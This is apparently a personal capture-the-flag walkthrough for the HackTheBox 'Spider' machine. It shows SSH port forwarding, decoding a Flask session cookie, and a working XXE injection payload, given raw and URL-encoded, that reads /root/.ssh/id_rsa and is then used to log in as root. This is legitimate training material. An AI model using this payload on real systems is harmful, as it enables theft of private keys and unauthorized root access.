# SSH 

![[Pasted image 20210530220350.png]]

# Listening Ports

```
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                                                              
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                                                                       
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -  

```

# Redirecting 8080 to our machine
```ssh -L 8080:127.0.0.1:8080 chiv@spider.htb```

![[Pasted image 20210530224823.png]]

The webpage just ask for a username, so lets put something random... and we're in. We see the server prints a Welcome username message... could this also be vulnerable to something?

![[Pasted image 20210531012409.png]]

Checking the cookie with flask-unsign

```bash
flask-unsign --decode --cookie='.eJxNjEFvgyAARv_KwnkHdHYHk14MqKPTBhSw3CA0w4rOVLNZm_73rcma7Pjy3vddgV96D-IreDIgBhyXqcVLTTsimJwH0QfyKIuLyVWreRrV2ZhYHiDasEIg9s6x29n-beXVjH79UPEy2adjzk6Juvs7K-gRlZZQiCOVur3JyrmUrhUBP8sebqxPsH1RncSb6RDCQGekEf_-_vaUhcurRCTTIWlMLqjucFQjMh39x4X1cyvCJeCZ_Xr0dPVnKVyl02QwqysKOIaHU8l239stuD2D8bMd5gnE8PYDYyBVjg.YLQb7Q.unSqfbo-QukckP6JGpHRENRoHWU' 
{'lxml': b'PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+Zm9vPDwvdXNlcm5hbWU+CiAgICAgICAgPGlzX2FkbWluPjA8L2lzX2FkbWluPgogICAgPC9kYXRhPgo8L3Jvb3Q+', 'points': 0}
```

We see it returns a base64 string, and after decoding we see it's a XML

```bash
echo "PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+Zm9vPDwvdXNlcm5hbWU+CiAgICAgICAgPGlzX2FkbWluPjA8L2lzX2FkbWluPgogICAgPC9kYXRhPgo8L3Jvb3Q+" | base64 -d                                      1 ⚙
<!-- API Version 1.0.0 -->
<root>
    <data>
        <username>foo</username>
        <is_admin>0</is_admin>
    </data>
</root>    
```

So this can be vulnerable to XXE Injection, since from burp suite we can modify the version and the username parameters.

```xml
1.0.0 -->
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///root/.ssh/id_rsa"> ]><!--
```

Encoded with URL:

```url
%31%2e%30%2e%30%20%2d%2d%3e%0a%3c%21%2d%2d%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%3f%2d%2d%3e%0a%3c%21%44%4f%43%54%59%50%45%20%72%65%70%6c%61%63%65%20%5b%3c%21%45%4e%54%49%54%59%20%65%6e%74%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%72%6f%6f%74%2f%2e%73%73%68%2f%69%64%5f%72%73%61%22%3e%20%5d%3e%3c%21%2d%2d
```

And on username with &ent;

![[Pasted image 20210531012948.png]]

Shall print out the Private key

###### Footnote
We can decode the generated token from our payload to see the final XML Result

![[Pasted image 20210531013205.png]]

# Getting Private Key

![[Pasted image 20210531012238.png]]

```bash
ssh root@spider.htb -i id_rsa
``` 

![[Pasted image 20210531012847.png]]